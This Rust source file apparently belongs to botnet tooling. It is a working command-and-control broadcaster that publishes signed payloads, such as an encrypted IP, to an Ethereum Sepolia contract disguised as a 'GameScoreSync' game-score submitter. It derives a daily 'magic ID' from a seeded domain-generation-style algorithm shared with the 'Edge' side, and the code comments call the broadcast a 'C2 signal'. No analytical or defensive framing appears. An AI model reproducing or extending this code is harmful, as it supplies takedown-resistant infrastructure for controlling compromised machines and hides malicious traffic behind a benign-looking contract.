use std::sync::Arc;
use ethers::prelude::*;
use ethers::signers::{LocalWallet, Signer};
use log::{info, error};
use std::time::{SystemTime, UNIX_EPOCH};

// --- CONFIGURATION ---
const SEPOLIA_RPC: &str = "https://rpc.sepolia.org";
const CONTRACT_ADDR: &str = "0x8A58Da9B24C24b9D6Faf2118eB3845FE7D4b13c5";
const DGA_SEED: u64 = 0x36A5EC9D09C60386;

// ABI Fragment for submitScore(uint256,bytes,uint8,bytes32,bytes32)
abigen!(
    GameScoreSync,
    r#"[
        function submitScore(uint256 magic_id, bytes calldata payload, uint8 v, bytes32 r, bytes32 s) external
    ]"#
);

/// Generates the Daily Magic ID (Same algo as Edge)
fn get_daily_magic() -> U256 {
    let start = SystemTime::now();
    let since_the_epoch = start.duration_since(UNIX_EPOCH).expect("Time went backwards");
    let day_slot = since_the_epoch.as_secs() / 86400;
    
    let mut state = day_slot ^ DGA_SEED;
    state ^= state << 13;
    state ^= state >> 7;
    state ^= state << 17;
    
    U256::from(state)
}

/// Broadcasts a C2 signal to the Sepolia blockchain.
/// - `eth_key_hex`: The ETH Master Private Key (Secp256k1), e.g. "0xabc..."
/// - `payload`: The data to broadcast (e.g., encrypted IP).
pub async fn broadcast_signal(eth_key_hex: &str, payload: Vec<u8>) -> Result<String, String> {
    // 1. Setup Provider
    let provider = Provider::<Http>::try_from(SEPOLIA_RPC)
        .map_err(|e| format!("RPC Error: {}", e))?;
    let chain_id: u64 = 11155111; // Sepolia

    // 2. Setup Wallet
    let wallet: LocalWallet = eth_key_hex.parse::<LocalWallet>()
        .map_err(|e| format!("Wallet Parse Error: {}", e))?
        .with_chain_id(chain_id);
    let client = SignerMiddleware::new(provider.clone(), wallet.clone());
    let client = Arc::new(client);

    // 3. Get Contract Instance
    let contract_addr: Address = CONTRACT_ADDR.parse()
        .map_err(|_| "Invalid Contract Address")?;
    let contract = GameScoreSync::new(contract_addr, client.clone());
    
    // 4. Prepare Magic ID
    let magic_id = get_daily_magic();
    info!("[ETH] Broadcasting with Magic ID: {:?}", magic_id);

    // 5. Create Message Hash (Matches Solidity logic)
    let msg_hash = ethers::utils::keccak256(
        ethers::abi::encode(&[
            ethers::abi::Token::Uint(magic_id),
            ethers::abi::Token::Bytes(payload.clone()),
        ])
    );
    
    // 6. Sign Message (EIP-191)
    let signature = wallet.sign_message(H256::from_slice(&msg_hash))
        .await
        .map_err(|e| format!("Signing Error: {}", e))?;
    
    let v: u8 = signature.v.try_into().map_err(|_| "V conversion failed")?;
    let r: [u8; 32] = signature.r.into();
    let s: [u8; 32] = signature.s.into();
    
    info!("[ETH] Signature: v={}, r={:?}..., s={:?}...", v, &r[0..4], &s[0..4]);

    // 7. Submit Transaction
    // Clone Bytes to ensure payload ownership is correct
    let payload_bytes: ethers::types::Bytes = payload.into();
    
    // Bind call to a variable to extend its lifetime
    let call = contract.submit_score(
        magic_id,
        payload_bytes,
        v,
        r,
        s
    );
    
    // Send and await result
    let pending_result = call.send().await;
    
    match pending_result {
        Ok(pending_tx) => {
            let tx_hash = pending_tx.tx_hash();
            info!("[ETH] TX Sent. Hash: {:?}", tx_hash);
            Ok(format!("TX Hash: {:?}", tx_hash))
        }
        Err(e) => {
            error!("[ETH] TX Failed: {}", e);
            Err(format!("TX Failed: {}", e))
        }
    }
}
